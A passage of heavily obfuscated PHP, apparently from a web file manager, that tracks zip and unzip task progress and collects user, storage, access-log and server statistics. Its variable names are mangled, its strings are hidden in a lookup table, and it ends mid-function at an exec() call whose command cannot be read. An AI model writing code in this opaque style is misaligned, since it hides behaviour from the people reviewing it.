array($this, $ºÅş»Ç[1750])); } public function updateAfter() { $Êó¯Ô± =& $_SERVER[„Ç©ñÎ©]; $š®ëØÕ­ =& $this->task; if (!$š®ëØÕ­[$Êó¯Ô±[789]] || !$š®ëØÕ­[$Êó¯Ô±[766]]) { return; } if ($š®ëØÕ­[$Êó¯Ô±[1751]] == $Êó¯Ô±[1198]) { $ğ“ö¹¤ı = 0; if ($š®ëØÕ­[$Êó¯Ô±[1706]]) { $ğ“ö¹¤ı = $š®ëØÕ­[$Êó¯Ô±[1707]] / $š®ëØÕ­[$Êó¯Ô±[1706]]; } $š®ëØÕ­[$Êó¯Ô±[1657]] = $ğ“ö¹¤ı * 0.3; } else { if ($š®ëØÕ­[$Êó¯Ô±[1751]] == $Êó¯Ô±[322]) { $ğ“ö¹¤ı = $š®ëØÕ­[$Êó¯Ô±[1656]] / $š®ëØÕ­[$Êó¯Ô±[789]]; $š®ëØÕ­[$Êó¯Ô±[1657]] = 0.3 + $ğ“ö¹¤ı * 0.4; } else { if ($š®ëØÕ­[$Êó¯Ô±[1751]] == $Êó¯Ô±[117]) { $ÕÚ³› = 0; if ($š®ëØÕ­[$Êó¯Ô±[1708]] == $Êó¯Ô±[117]) { $ÕÚ³› = $š®ëØÕ­[$Êó¯Ô±[1707]]; } $ğ“ö¹¤ı = ($š®ëØÕ­[$Êó¯Ô±[1711]] + $ÕÚ³›) / $š®ëØÕ­[$Êó¯Ô±[766]]; $š®ëØÕ­[$Êó¯Ô±[1657]] = 0.3 + 0.4 + $ğ“ö¹¤ı * 0.3; } } } if ($š®ëØÕ­[$Êó¯Ô±[1657]] > 0) { $Ïùûê®Ç = timeFloat() - $š®ëØÕ­[$Êó¯Ô±[1659]] - $š®ëØÕ­[$Êó¯Ô±[1662]]; $š®ëØÕ­[$Êó¯Ô±[1663]] = $Ïùûê®Ç * (1 - $š®ëØÕ­[$Êó¯Ô±[1657]]) / $š®ëØÕ­[$Êó¯Ô±[1657]]; } } public function addFile($ŒÅÔÕ³) { $ÉÌ•Ö‘Î =& $_SERVER[„Ç©ñÎ©]; $Äğİçà =& $this->task; $ÌßÉä¦Á = IO::info($ŒÅÔÕ³); $Äğİçà[$ÉÌ•Ö‘Î[1704]] = $ÌßÉä¦Á[$ÉÌ•Ö‘Î[32]]; $Äğİçà[$ÉÌ•Ö‘Î[1706]] = $ÌßÉä¦Á[$ÉÌ•Ö‘Î[86]]; $Äğİçà[$ÉÌ•Ö‘Î[1707]] = 0; $Äğİçà[$ÉÌ•Ö‘Î[1063]] = $ÉÌ•Ö‘Î[1727]; $Äğİçà[$ÉÌ•Ö‘Î[1708]] = $ÉÌ•Ö‘Î[1198]; $Äğİçà[$ÉÌ•Ö‘Î[766]] = $ÌßÉä¦Á[$ÉÌ•Ö‘Î[86]]; $Äğİçà[$ÉÌ•Ö‘Î[789]] = 1; $¿ÆŒíÕ  = 0; $Äğİçà[$ÉÌ•Ö‘Î[1715]] = array($ÉÌ•Ö‘Î[1716] => $¿ÆŒíÕ  + 1, $ÉÌ•Ö‘Î[429] => $ÌßÉä¦Á[$ÉÌ•Ö‘Î[32]], $ÉÌ•Ö‘Î[94] => $ÌßÉä¦Á[$ÉÌ•Ö‘Î[94]], $ÉÌ•Ö‘Î[528] => $ÌßÉä¦Á[$ÉÌ•Ö‘Î[528]] ? $ÌßÉä¦Á[$ÉÌ•Ö‘Î[528]] : $ÌßÉä¦Á[$ÉÌ•Ö‘Î[94]]); $this->update(); } public function unzipAfter($¾¢îÉÈ‘) { $Ä¯¯ù˜æ =& $_SERVER[„Ç©ñÎ©]; $Ô×çšàß =& $this->task; $Ô×çšàß[$Ä¯¯ù˜æ[1751]] = $Ä¯¯ù˜æ[117]; $£ÃÙˆ²£ = IO::infoWithChildren($¾¢îÉÈ‘); $Ú®¯ˆÊ = 0; $Ô×çšàß[$Ä¯¯ù˜æ[1715]] = array($Ä¯¯ù˜æ[1716] => $Ú®¯ˆÊ + 1, $Ä¯¯ù˜æ[429] => $£ÃÙˆ²£[$Ä¯¯ù˜æ[32]], $Ä¯¯ù˜æ[94] => $£ÃÙˆ²£[$Ä¯¯ù˜æ[94]], $Ä¯¯ù˜æ[528] => $£ÃÙˆ²£[$Ä¯¯ù˜æ[528]] ? $£ÃÙˆ²£[$Ä¯¯ù˜æ[528]] : $£ÃÙˆ²£[$Ä¯¯ù˜æ[94]]); if ($£ÃÙˆ²£[$Ä¯¯ù˜æ[33]] == $Ä¯¯ù˜æ[209]) { $Ô×çšàß[$Ä¯¯ù˜æ[789]] = 1; } else { $Ô×çšàß[$Ä¯¯ù˜æ[789]] = $£ÃÙˆ²£[$Ä¯¯ù˜æ[89]][$Ä¯¯ù˜æ[87]]; } $Ô×çšàß[$Ä¯¯ù˜æ[1063]] = $Ä¯¯ù˜æ[12]; $Ô×çšàß[$Ä¯¯ù˜æ[1708]] = 0; $Ô×çšàß[$Ä¯¯ù˜æ[1656]] = 0; $Ô×çšàß[$Ä¯¯ù˜æ[1706]] = 0; $Ô×çšàß[$Ä¯¯ù˜æ[1707]] = 0; $Ô×çšàß[$Ä¯¯ù˜æ[1704]] = $Ä¯¯ù˜æ[12]; $Ô×çšàß[$Ä¯¯ù˜æ[1711]] = 0; $Ô×çšàß[$Ä¯¯ù˜æ[766]] = $£ÃÙˆ²£[$Ä¯¯ù˜æ[86]]; $this->update(); self::log($Ä¯¯ù˜æ[1753] . json_encode(array($Ô×çšàß, $£ÃÙˆ²£))); } public function nameParse($‹ÀĞ®Ãé) { $íà´Ÿ†è =& $_SERVER[„Ç©ñÎ©]; $Ñê÷ì =& $this->task; if ($Ñê÷ì[$íà´Ÿ†è[1751]] == $íà´Ÿ†è[1198]) { $Ñê÷ì[$íà´Ÿ†è[1751]] = $íà´Ÿ†è[322]; $Ñê÷ì[$íà´Ÿ†è[1711]] = 0; $Ñê÷ì[$íà´Ÿ†è[766]] = 0; } $·ƒ–è§» = get_path_this($‹ÀĞ®Ãé); if (strstr($·ƒ–è§», $íà´Ÿ†è[10])) { $Ñê÷ì[$íà´Ÿ†è[1656]] += 1; $Ñê÷ì[$íà´Ÿ†è[789]] += 1; } $Ñê÷ì[$íà´Ÿ†è[1704]] = $‹ÀĞ®Ãé; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $ÔàùÏ™à =& $_SERVER[„Ç©ñÎ©]; parent::startAfter(); Hook::bind($ÔàùÏ™à[1754], array($this, $ÔàùÏ™à[1749])); $Ÿîæ¨ğ =& $this->task; $Ÿîæ¨ğ[$ÔàùÏ™à[1751]] = $ÔàùÏ™à[1198]; if (!$Ÿîæ¨ğ[$ÔàùÏ™à[1554]]) { $Ÿîæ¨ğ[$ÔàùÏ™à[1554]] = LNG($ÔàùÏ™à[1755]); } } protected function endAfter() { $îïÔ€øç =& $_SERVER[„Ç©ñÎ©]; parent::endAfter(); Hook::unbind($îïÔ€øç[1754], array($this, $îïÔ€øç[1749])); } public function updateAfter() { $ ³Ü­„¡ =& $_SERVER[„Ç©ñÎ©]; $ƒ‘¬×³´ =& $this->task; if (!$ƒ‘¬×³´[$ ³Ü­„¡[789]] || !$ƒ‘¬×³´[$ ³Ü­„¡[766]]) { return; } if ($ƒ‘¬×³´[$ ³Ü­„¡[1751]] == $ ³Ü­„¡[1198]) { $½¬†»ˆš = $ƒ‘¬×³´[$ ³Ü­„¡[1707]]; if ($ƒ‘¬×³´[$ ³Ü­„¡[1708]] != $ ³Ü­„¡[1198]) { $½¬†»ˆš = 0; } $£†¹ØŞ = ($ƒ‘¬×³´[$ ³Ü­„¡[1711]] + $½¬†»ˆš) / $ƒ‘¬×³´[$ ³Ü­„¡[766]]; $ƒ‘¬×³´[$ ³Ü­„¡[1657]] = $£†¹ØŞ * 0.3; } else { if ($ƒ‘¬×³´[$ ³Ü­„¡[1751]] == $ ³Ü­„¡[322]) { $£†¹ØŞ = $ƒ‘¬×³´[$ ³Ü­„¡[1656]] / $ƒ‘¬×³´[$ ³Ü­„¡[789]]; $ƒ‘¬×³´[$ ³Ü­„¡[1657]] = 0.3 + $£†¹ØŞ * 0.5; } else { if ($ƒ‘¬×³´[$ ³Ü­„¡[1751]] == $ ³Ü­„¡[117]) { $£†¹ØŞ = 0; if ($ƒ‘¬×³´[$ ³Ü­„¡[1706]]) { $£†¹ØŞ = $ƒ‘¬×³´[$ ³Ü­„¡[1707]] / $ƒ‘¬×³´[$ ³Ü­„¡[1706]]; } $ƒ‘¬×³´[$ ³Ü­„¡[1657]] = 0.3 + 0.5 + $£†¹ØŞ * 0.2; } } } if ($ƒ‘¬×³´[$ ³Ü­„¡[1657]] > 0) { $¢ÎúŸš = timeFloat() - $ƒ‘¬×³´[$ ³Ü­„¡[1659]] - $ƒ‘¬×³´[$ ³Ü­„¡[1662]]; $ƒ‘¬×³´[$ ³Ü­„¡[1663]] = $¢ÎúŸš * (1 - $ƒ‘¬×³´[$ ³Ü­„¡[1657]]) / $ƒ‘¬×³´[$ ³Ü­„¡[1657]]; } } public function copyFileStart($ù¶»ŞÌá, $Ãúãù¾œ, $²ê€æÈõ, $¤ÔÓ¬¶ñ, $Ã¸¤ÚÓ², $éï¿Ö’Á) { $³¨¶Åë© =& $_SERVER[„Ç©ñÎ©]; parent::copyFileStart($ù¶»ŞÌá, $Ãúãù¾œ, $²ê€æÈõ, $¤ÔÓ¬¶ñ, $Ã¸¤ÚÓ², $éï¿Ö’Á); $Œã¿şê§ =& $this->task; if ($Œã¿şê§[$³¨¶Åë©[1751]] == $³¨¶Åë©[322]) { $Œã¿şê§[$³¨¶Åë©[1751]] = $³¨¶Åë©[117]; } $this->update(); } public function copyFileEnd($ù¤­€ùÄ, $âíºĞÍÙ, $ÍÚ›ÎÈò, $ò¡¢Ô©ï, $ï ğúşƒ, $ë¡—²…é) { $ÌãÚ·â =& $_SERVER[„Ç©ñÎ©]; $µ­áôô =& $this->task; $µ­áôô[$ÌãÚ·â[1707]] = $µ­áôô[$ÌãÚ·â[1706]]; $µ­áôô[$ÌãÚ·â[1711]] += $µ­áôô[$ÌãÚ·â[1706]]; $µ­áôô[$ÌãÚ·â[1708]] = $ÌãÚ·â[12]; $this->update(); } public function nameParse($¸Ë¶“½) { $‹šÓØ•® =& $_SERVER[„Ç©ñÎ©]; $¥Üè¿Á =& $this->task; if ($¥Üè¿Á[$‹šÓØ•®[1656]] < $¥Üè¿Á[$‹šÓØ•®[789]]) { $¹Á°Â²‰ = get_path_this($¸Ë¶“½); if (strstr($¹Á°Â²‰, $‹šÓØ•®[10])) { $¥Üè¿Á[$‹šÓØ•®[1656]] += 1; } } if ($¥Üè¿Á[$‹šÓØ•®[1751]] == $‹šÓØ•®[1198]) { $¥Üè¿Á[$‹šÓØ•®[1751]] = $‹šÓØ•®[322]; } $¥Üè¿Á[$‹šÓØ•®[1704]] = $¸Ë¶“½; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($™Ø¹÷) { $¥æÈƒÈ  =& $_SERVER[„Ç©ñÎ©]; $´›‹çá¿ = array($¥æÈƒÈ [609] => array($¥æÈƒÈ [33] => $¥æÈƒÈ [1756], $¥æÈƒÈ [282] => array($¥æÈƒÈ [234], $¥æÈƒÈ [768], $¥æÈƒÈ [1757], $¥æÈƒÈ [1758])), $¥æÈƒÈ [1759] => array($¥æÈƒÈ [33] => $¥æÈƒÈ [1760], $¥æÈƒÈ [282] => array($¥æÈƒÈ [234], $¥æÈƒÈ [766], $¥æÈƒÈ [1761], $¥æÈƒÈ [1762], $¥æÈƒÈ [1763]))); if (!isset($´›‹çá¿[$™Ø¹÷])) { return !1; } $this->optionType = $´›‹çá¿[$™Ø¹÷][$¥æÈƒÈ [33]]; $this->field = $´›‹çá¿[$™Ø¹÷][$¥æÈƒÈ [282]]; return !0; } public function listData($¸Î™ƒ¥Ÿ = false, $—ğŞ—Â = "\155\157\144\x69\x66\171\x54\151\x6d\x65", $€Õ“¤¥¼ = false) { return parent::listData($¸Î™ƒ¥Ÿ, $—ğŞ—Â, $€Õ“¤¥¼); } public function trendList($ç¬Ç¬æ) { $­˜ğÅ =& $_SERVER[„Ç©ñÎ©]; $ñÙ¸¹â = $this->listData(); if ($ñÙ¸¹â) { $‰×‡ÏËÅ = end($ñÙ¸¹â); $Î•åò¾¤ = date($­˜ğÅ[1764], strtotime($­˜ğÅ[1765])); if ($‰×‡ÏËÅ[$­˜ğÅ[234]] == $Î•åò¾¤) { return $ñÙ¸¹â; } $›®öŒÓ¥ = strtotime($‰×‡ÏËÅ[$­˜ğÅ[234]]); } if (!isset($›®öŒÓ¥)) { $Öğó®î = $ç¬Ç¬æ == $­˜ğÅ[609] ? $­˜ğÅ[544] : $­˜ğÅ[828]; $›®öŒÓ¥ = Model($Öğó®î)->min($­˜ğÅ[210]); } $Ÿ›¾ö¯ = $­˜ğÅ[1766] . ucfirst($ç¬Ç¬æ); $Àˆ“ı—ê = $this->dateList($›®öŒÓ¥); foreach ($Àˆ“ı—ê as $Î•åò¾¤) { $this->{$Ÿ›¾ö¯}($Î•åò¾¤); } return $this->listData(); } private function dateList($ôäŒ›À¿) { $¼î¯ÀÔ =& $_SERVER[„Ç©ñÎ©]; $ò©“ˆ™­ = $ôäŒ›À¿; $Ú¼“úèĞ = strtotime($¼î¯ÀÔ[1765]); $£“š€¿Á = array(); while ($ò©“ˆ™­ <= $Ú¼“úèĞ) { $£“š€¿Á[] = date($¼î¯ÀÔ[1764], $ò©“ˆ™­); $ò©“ˆ™­ = strtotime($¼î¯ÀÔ[1767], $ò©“ˆ™­); } return $£“š€¿Á; } public function _recordUser($˜ˆÏµš¹ = '') { $±ëËûÆÎ =& $_SERVER[„Ç©ñÎ©]; $İÊëú£ù = strtotime(date($±ëËûÆÎ[1768], strtotime($˜ˆÏµš¹))); $û–ØÏ¯´ = strtotime(date($±ëËûÆÎ[1769], strtotime($˜ˆÏµš¹))); $»àˆ“ôª = array($±ëËûÆÎ[210] => array($±ëËûÆÎ[1012], $û–ØÏ¯´)); $³í‚ÚÏú = Model($±ëËûÆÎ[544])->where($»àˆ“ôª)->count($±ëËûÆÎ[1655]); $»àˆ“ôª[$±ëËûÆÎ[210]] = array($±ëËûÆÎ[342], array($İÊëú£ù, $û–ØÏ¯´)); $ÑŸıÌõÚ = Model($±ëËûÆÎ[544])->where($»àˆ“ôª)->count($±ëËûÆÎ[1655]); $»àˆ“ôª[$±ëËûÆÎ[33]] = $±ëËûÆÎ[1770]; $ôËÙüÏÆ = Model($±ëËûÆÎ[1771])->where($»àˆ“ôª)->count($±ëËûÆÎ[1772]); $ôÆ±ø¨† = array($±ëËûÆÎ[234] => $˜ˆÏµš¹, $±ëËûÆÎ[768] => (int) $³í‚ÚÏú, $±ëËûÆÎ[1757] => (int) $ÑŸıÌõÚ, $±ëËûÆÎ[1758] => (int) $ôËÙüÏÆ); return $this->insert($ôÆ±ø¨†); } public function _recordStore($Å‰×¹” = '') { $ıß×Ë¼ =& $_SERVER[„Ç©ñÎ©]; $Ø‘À×¹‰ = strtotime(date($ıß×Ë¼[1769], strtotime($Å‰×¹”))); $ğÚÚ±§Ÿ = array($ıß×Ë¼[210] => array($ıß×Ë¼[1012], $Ø‘À×¹‰)); $àÁöÁõ = Model($ıß×Ë¼[480])->where($ğÚÚ±§Ÿ)->sum($ıß×Ë¼[86]); $ğÚÚ±§Ÿ[$ıß×Ë¼[419]] = 0; $¶œŞãÂ¼ = Model($ıß×Ë¼[828])->where($ğÚÚ±§Ÿ)->sum($ıß×Ë¼[86]); $ğÚÚ±§Ÿ[$ıß×Ë¼[420]] = 1; $ÆŒÒ¥ÇÍ = Model($ıß×Ë¼[828])->where($ğÚÚ±§Ÿ)->sum($ıß×Ë¼[86]); $ğÚÚ±§Ÿ[$ıß×Ë¼[420]] = 2; $‘ÈÀŸÁÎ = Model($ıß×Ë¼[828])->where($ğÚÚ±§Ÿ)->sum($ıß×Ë¼[86]); $¤º‚‹³Œ = array($ıß×Ë¼[234] => $Å‰×¹”, $ıß×Ë¼[766] => (int) $¶œŞãÂ¼, $ıß×Ë¼[1761] => (int) $àÁöÁõ, $ıß×Ë¼[1762] => (int) $ÆŒÒ¥ÇÍ, $ıß×Ë¼[1763] => (int) $‘ÈÀŸÁÎ); return $this->insert($¤º‚‹³Œ); } public function trend($²ş²ƒ†„, $Ûè¨İÈ) { $†Æô¤úÄ =& $_SERVER[„Ç©ñÎ©]; if (!$this->init($²ş²ƒ†„)) { return !1; } $ğø¸ŞïÉ = $this->trendList($²ş²ƒ†„); if ($ğø¸ŞïÉ && $Ûè¨İÈ != $†Æô¤úÄ[1628]) { $™©ê¶»¦ = $ğø¸ŞïÉ[0][$†Æô¤úÄ[234]]; $ğ­«†Õ› = $this->validDate($Ûè¨İÈ, $™©ê¶»¦); $ïÕéÌ“ = array(); $—µğ¡¿ = array_to_keyvalue($ğø¸ŞïÉ, $†Æô¤úÄ[234]); foreach ($ğ­«†Õ› as $ı‹ÑÃ¿À) { if (isset($—µğ¡¿[$ı‹ÑÃ¿À])) { $ìÎ÷…š± = $—µğ¡¿[$ı‹ÑÃ¿À]; } else { $ìÎ÷…š± = end($ğø¸ŞïÉ); $ìÎ÷…š±[$†Æô¤úÄ[234]] = $ı‹ÑÃ¿À; if ($²ş²ƒ†„ == $†Æô¤úÄ[609]) { $ìÎ÷…š±[$†Æô¤úÄ[1757]] = $ìÎ÷…š±[$†Æô¤úÄ[1758]] = 0; } } $ïÕéÌ“[] = $ìÎ÷…š±; } $ğø¸ŞïÉ = $ïÕéÌ“; } $íÎ¬òÅ = array($†Æô¤úÄ[609] => array($†Æô¤úÄ[768] => LNG($†Æô¤úÄ[1773]), $†Æô¤úÄ[1757] => LNG($†Æô¤úÄ[1774]), $†Æô¤úÄ[1758] => LNG($†Æô¤úÄ[1775])), $†Æô¤úÄ[1759] => array($†Æô¤úÄ[766] => LNG($†Æô¤úÄ[1776]), $†Æô¤úÄ[1761] => LNG($†Æô¤úÄ[1777]), $†Æô¤úÄ[1762] => LNG($†Æô¤úÄ[1778]), $†Æô¤úÄ[1763] => LNG($†Æô¤úÄ[1779]))); $Ô…ÌñÏì = array($†Æô¤úÄ[609] => $†Æô¤úÄ[1780], $†Æô¤úÄ[1759] => $†Æô¤úÄ[86]); if (empty($ğø¸ŞïÉ)) { $ı‹ÑÃ¿À = date($†Æô¤úÄ[1764], strtotime($†Æô¤úÄ[1765])); $úùÀŸåï = array($†Æô¤úÄ[234] => $ı‹ÑÃ¿À); foreach ($íÎ¬òÅ[$²ş²ƒ†„] as $¼×öõ¿Ş => $®ƒçÁÊµ) { $úùÀŸåï[$¼×öõ¿Ş] = 0; } $ğø¸ŞïÉ[] = $úùÀŸåï; } $ÚÕ¦ÕÍ’ = array(); foreach ($ğø¸ŞïÉ as $®ƒçÁÊµ) { if ($²ş²ƒ†„ == $†Æô¤úÄ[1759] && $®ƒçÁÊµ[$†Æô¤úÄ[1761]] > $®ƒçÁÊµ[$†Æô¤úÄ[766]]) { $®ƒçÁÊµ[$†Æô¤úÄ[1761]] = $®ƒçÁÊµ[$†Æô¤úÄ[766]]; } foreach ($íÎ¬òÅ[$²ş²ƒ†„] as $¼×öõ¿Ş => $Œ›Ğ†³Õ) { $ìÎ÷…š± = array($†Æô¤úÄ[234] => $®ƒçÁÊµ[$†Æô¤úÄ[234]], $†Æô¤úÄ[1554] => $Œ›Ğ†³Õ); $ìÎ÷…š±[$Ô…ÌñÏì[$²ş²ƒ†„]] = isset($®ƒçÁÊµ[$¼×öõ¿Ş]) ? $®ƒçÁÊµ[$¼×öõ¿Ş] : 0; $ÚÕ¦ÕÍ’[] = $ìÎ÷…š±; } } return $ÚÕ¦ÕÍ’; } public function validDate($×Àà­¹™, $®¦»â¬ì) { $ÍÃóé—÷ =& $_SERVER[„Ç©ñÎ©]; $Áº² Òœ = date($ÍÃóé—÷[1764], strtotime($ÍÃóé—÷[1765])); $“÷Ê‰­¼ = array($Áº² Òœ); switch ($×Àà­¹™) { case $ÍÃóé—÷[1635]: $ê¾ãÍò¨ = mktime(0, 0, 0, date($ÍÃóé—÷[1781]), date($ÍÃóé—÷[1374]) - date($ÍÃóé—÷[1437]) + 7 - 7, date($ÍÃóé—÷[1782])); $Ö„ŠŞ‹Ë = 0; do { $«Ç»æ¯ = date($ÍÃóé—÷[1764], $ê¾ãÍò¨ - 3600 * 24 * 7 * $Ö„ŠŞ‹Ë); $“÷Ê‰­¼[] = $«Ç»æ¯; $Ö„ŠŞ‹Ë++; } while ($®¦»â¬ì < $«Ç»æ¯); break; case $ÍÃóé—÷[1633]: $Ö„ŠŞ‹Ë = 1; do { $™¦¢©„ = date($ÍÃóé—÷[1783], strtotime("\x2d\x20{$Ö„ŠŞ‹Ë}\x20\x6d\x6f\156\x74\150\x73")); $“÷Ê‰­¼[] = $™¦¢©„; $Ö„ŠŞ‹Ë++; } while ($®¦»â¬ì < $™¦¢©„); break; case $ÍÃóé—÷[1784]: $ŠØÏ¸—Ä = (int) date($ÍÃóé—÷[1782], strtotime($®¦»â¬ì)); $Ôª™ = (int) date($ÍÃóé—÷[1782]); if ($ŠØÏ¸—Ä >= $Ôª™) { break; } for ($ŠØÏ¸—Ä; $ŠØÏ¸—Ä < $Ôª™; $ŠØÏ¸—Ä++) { $“÷Ê‰­¼[] = $ŠØÏ¸—Ä . $ÍÃóé—÷[1785]; } break; default: break; } if ($®¦»â¬ì > end($“÷Ê‰­¼)) { array_pop($“÷Ê‰­¼); } sort($“÷Ê‰­¼); return $“÷Ê‰­¼; } public function listTable($±ó„¡æ¾) { $¶Ø¤±· = ucfirst($±ó„¡æ¾); return Model($¶Ø¤±·)->listData(); } public function option($±Ä¼Š®Ğ) { $•¬Œé«˜ = $_SERVER[„Ç©ñÎ©][1786] . ucfirst($±Ä¼Š®Ğ); return $this->{$•¬Œé«˜}(); } private function optionUser() { $Äá­“ŞÎ =& $_SERVER[„Ç©ñÎ©]; $—êé‚Œ = Model($Äá­“ŞÎ[544])->count($Äá­“ŞÎ[1655]); $å•ÜÄâ„ = Model($Äá­“ŞÎ[544])->where($Äá­“ŞÎ[1787])->count($Äá­“ŞÎ[1655]); $íªšîüå = intval($GLOBALS[$Äá­“ŞÎ[6]][$Äá­“ŞÎ[358]][$Äá­“ŞÎ[1610]]) / 3600; $²ğ£€ = strtotime("\x2d{$íªšîüå}\40\x68\157\x75\x72\163"); $‹‡ËÒ¢Á = strtotime(date($Äá­“ŞÎ[1768])); if ($²ğ£€ < $‹‡ËÒ¢Á) { $²ğ£€ = $‹‡ËÒ¢Á; } $¼¥š…¸ = array($Äá­“ŞÎ[1788] => array($Äá­“ŞÎ[1013], $²ğ£€)); $ª¥×¸‹ = (int) Model($Äá­“ŞÎ[544])->where($¼¥š…¸)->count($Äá­“ŞÎ[1655]); if (!$ª¥×¸‹) { $ª¥×¸‹ = 1; } $¼¥š…¸ = array($Äá­“ŞÎ[1788] => array($Äá­“ŞÎ[1013], $‹‡ËÒ¢Á)); $èøú”‘Ù = Model($Äá­“ŞÎ[544])->where($¼¥š…¸)->count($Äá­“ŞÎ[1655]); return array($Äá­“ŞÎ[762] => (int) $—êé‚Œ, $Äá­“ŞÎ[1789] => (int) ($—êé‚Œ - $å•ÜÄâ„), $Äá­“ŞÎ[1790] => (int) $å•ÜÄâ„, $Äá­“ŞÎ[1791] => (int) $èøú”‘Ù, $Äá­“ŞÎ[1792] => $ª¥×¸‹); } private function optionFile() { $ŞÎØÄÒ” =& $_SERVER[„Ç©ñÎ©]; $Àí‰Ö¼‡ = $this->sourceSize(); $¦èóÓôç = $Àí‰Ö¼‡[$ŞÎØÄÒ”[86]]; $íÓƒİƒÄ = $Àí‰Ö¼‡[$ŞÎØÄÒ”[1761]]; $®Á©÷ë÷ = Model($ŞÎØÄÒ”[828])->where(array($ŞÎØÄÒ”[419] => 0))->count($ŞÎØÄÒ”[411]); $İ©Ùê½ = array($ŞÎØÄÒ”[419] => 0, $ŞÎØÄÒ”[210] => array($ŞÎØÄÒ”[1013], strtotime(date($ŞÎØÄÒ”[1768])))); $ß™á˜ã€ = Model($ŞÎØÄÒ”[828])->where($İ©Ùê½)->sum($ŞÎØÄÒ”[86]); $Ğ½•ÈêË = Model($ŞÎØÄÒ”[828])->where($İ©Ùê½)->count($ŞÎØÄÒ”[411]); return array($ŞÎØÄÒ”[766] => $¦èóÓôç, $ŞÎØÄÒ”[1761] => $íÓƒİƒÄ, $ŞÎØÄÒ”[1793] => $¦èóÓôç - $íÓƒİƒÄ, $ŞÎØÄÒ”[1794] => (int) $ß™á˜ã€, $ŞÎØÄÒ”[768] => (int) $®Á©÷ë÷, $ŞÎØÄÒ”[1795] => (int) $Ğ½•ÈêË); } private function optionAccess() { $ÇÎ£æÛ» =& $_SERVER[„Ç©ñÎ©]; return array($ÇÎ£æÛ»[762] => $this->typeLogCnt(), $ÇÎ£æÛ»[117] => $this->typeLogCnt($ÇÎ£æÛ»[117]), $ÇÎ£æÛ»[461] => $this->typeLogCnt($ÇÎ£æÛ»[461]), $ÇÎ£æÛ»[1796] => $this->typeLogCnt($ÇÎ£æÛ»[1796]), $ÇÎ£æÛ»[1797] => $this->typeLogCnt($ÇÎ£æÛ»[1797]), $ÇÎ£æÛ»[609] => $this->typeLogCnt($ÇÎ£æÛ»[12], $ÇÎ£æÛ»[1772])); } private function typeLogCnt($èÅÆ¤ŒÀ = '', $”»‚Ø³ñ = "\x69\144") { $ªåÉæÛ› =& $_SERVER[„Ç©ñÎ©]; $ìñóæÃú = array($ªåÉæÛ›[117] => array($ªåÉæÛ›[1798], $ªåÉæÛ›[1799]), $ªåÉæÛ›[461] => array($ªåÉæÛ›[1800], $ªåÉæÛ›[1801]), $ªåÉæÛ›[1796] => array($ªåÉæÛ›[1802], $ªåÉæÛ›[1803], $ªåÉæÛ›[1804]), $ªåÉæÛ›[1797] => array($ªåÉæÛ›[1805], $ªåÉæÛ›[1806]), $ªåÉæÛ›[1807] => array($ªåÉæÛ›[1808], $ªåÉæÛ›[1809], $ªåÉæÛ›[1810])); $ÀÂ‚­Ùß = strtotime(date($ªåÉæÛ›[1768])); $¦€ñé¥ = array($ªåÉæÛ›[210] => array($ªåÉæÛ›[1013], $ÀÂ‚­Ùß)); if ($èÅÆ¤ŒÀ) { $¦€ñé¥[$ªåÉæÛ›[33]] = array($ªåÉæÛ›[7], $ìñóæÃú[$èÅÆ¤ŒÀ]); } $ƒ…‰üû = Model($ªåÉæÛ›[1771])->where($¦€ñé¥)->count($”»‚Ø³ñ); return (int) $ƒ…‰üû; } private function optionServer() { $˜ßé’²Ó =& $_SERVER[„Ç©ñÎ©]; $¶®²üæ˜ = $this->diskDriver(); $ŒÊ¨Ûïƒ = KodIO::defaultDriver(); $À˜€ŸÖˆ = array($˜ßé’²Ó[820] => $ŒÊ¨Ûïƒ[$˜ßé’²Ó[408]]); $äÊĞ¿ÆÄ = Model($˜ßé’²Ó[480])->where($À˜€ŸÖˆ)->sum($˜ßé’²Ó[86]); $È”®¾¨ = explode($˜ßé’²Ó[53], $_SERVER[$˜ßé’²Ó[153]]); $âÉ÷ÎšÔ = $È”®¾¨[0]; $ù“ÛØÃ€ = $GLOBALS[$˜ßé’²Ó[6]][$˜ßé’²Ó[21]]; $Á×§‹€¢ = $ù“ÛØÃ€[$˜ßé’²Ó[975]]; if ($Á×§‹€¢ == $˜ßé’²Ó[963]) { $á³€Ğ“í = explode($˜ßé’²Ó[1271], $ù“ÛØÃ€[$˜ßé’²Ó[974]]); $Á×§‹€¢ = $á³€Ğ“í[0]; } if ($Á×§‹€¢ == $˜ßé’²Ó[911] || $Á×§‹€¢ == $˜ßé’²Ó[807]) { $ıîäÖİƒ = Model()->db()->query($˜ßé’²Ó[1811]); $¬× õ°Ì = $ıîäÖİƒ[0] && isset($ıîäÖİƒ[0][$˜ßé’²Ó[1553]]) ? $ıîäÖİƒ[0][$˜ßé’²Ó[1553]] : 0; $Á×§‹€¢ = $˜ßé’²Ó[1812] . ($¬× õ°Ì ? $˜ßé’²Ó[8] . $¬× õ°Ì : $˜ßé’²Ó[12]); } $ì–ù§üĞ = $GLOBALS[$˜ßé’²Ó[6]][$˜ßé’²Ó[358]][$˜ßé’²Ó[830]]; return array($˜ßé’²Ó[1813] => $¶®²üæ˜ ? $¶®²üæ˜[$˜ßé’²Ó[1814]] : 0, $˜ßé’²Ó[1815] => $¶®²üæ˜ ? $¶®²üæ˜[$˜ßé’²Ó[1816]] : 0, $˜ßé’²Ó[1817] => (int) $ŒÊ¨Ûïƒ[$˜ßé’²Ó[1814]] * 1024 * 1024 * 1024, $˜ßé’²Ó[1818] => (int) $äÊĞ¿ÆÄ, $˜ßé’²Ó[1819] => ucfirst($âÉ÷ÎšÔ), $˜ßé’²Ó[1820] => $˜ßé’²Ó[1821] . PHP_VERSION, $˜ßé’²Ó[1822] => phpBuild64() ? 64 : 32, $˜ßé’²Ó[761] => str_replace($˜ßé’²Ó[1129], $˜ßé’²Ó[991], $Á×§‹€¢), $˜ßé’²Ó[358] => ucfirst($ì–ù§üĞ), $˜ßé’²Ó[32] => $_SERVER[$˜ßé’²Ó[1823]]); } private function diskDriver() { $˜ãÅ‘ÚË =& $_SERVER[„Ç©ñÎ©]; $×ôÛ†î¦ = $˜ãÅ‘ÚË[8]; $‚ñ¢†ûê = $GLOBALS[$˜ãÅ‘ÚË[6]][$˜ãÅ‘ÚË[1287]] == $˜ãÅ‘ÚË[1288]; if ($‚ñ¢†ûê) { $×ôÛ†î¦ = $˜ãÅ‘ÚË[1824]; if (function_exists($˜ãÅ‘ÚË[1825])) { exec($˜ãÅ‘ÚË[1826], $÷ğ¬œÀ°); $×ôÛ†î¦ = 